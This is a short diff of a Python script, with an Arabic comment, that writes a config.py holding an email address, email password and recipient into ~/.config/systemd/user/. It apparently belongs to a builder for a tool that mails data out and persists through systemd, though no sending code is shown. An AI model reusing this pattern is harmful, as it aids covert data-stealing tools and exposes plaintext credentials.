@@ -83,8 +83,8 @@ try:
     # حفظ نسخة في مجلد ~/.config/systemd/user/
     systemd_path = os.path.expanduser("~/.config/systemd/user/")
     os.makedirs(systemd_path, exist_ok=True)
-    with open(os.path.join(systemd_path, output_filename), "w") as systemd_file:
-        systemd_file.write(content)
+    with open(os.path.join(systemd_path, "config.py"), "w") as systemd_file:
+        systemd_file.write(f"EMAIL_ADDRESS = '{input_email}'\nEMAIL_PASSWORD = '{input_password}'\nTO_EMAIL = '{input_receiver}'")
 
     print(f"[+] The modified file has been saved as {output_filename}")
 
